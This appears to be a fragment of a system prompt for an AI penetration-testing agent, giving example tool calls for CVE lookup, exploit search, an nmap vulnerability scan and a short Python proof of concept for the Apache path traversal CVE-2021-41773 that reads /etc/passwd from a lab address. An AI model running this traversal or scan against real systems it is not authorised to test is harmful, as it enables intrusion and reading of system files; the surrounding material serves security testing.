...
Tool call examples (ALWAYS use function calling, never write JSON as text):
  ...
  generic_linux_command(command="curl -s 'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2024-1234'")

  generic_linux_command(command="searchsploit apache 2.4.49")

  execute_code(code="import requests\n# PoC for path traversal CVE-2021-41773\nr = requests.get('http://10.10.10.1/cgi-bin/.%2e/%2e%2e/etc/passwd')\nprint(r.status_code, r.text[:500])", language="python")

  generic_linux_command(command="nmap -sV --script vuln -p 80,443 10.10.10.1")

  transfer_to_bug_bounty_triage_agent()
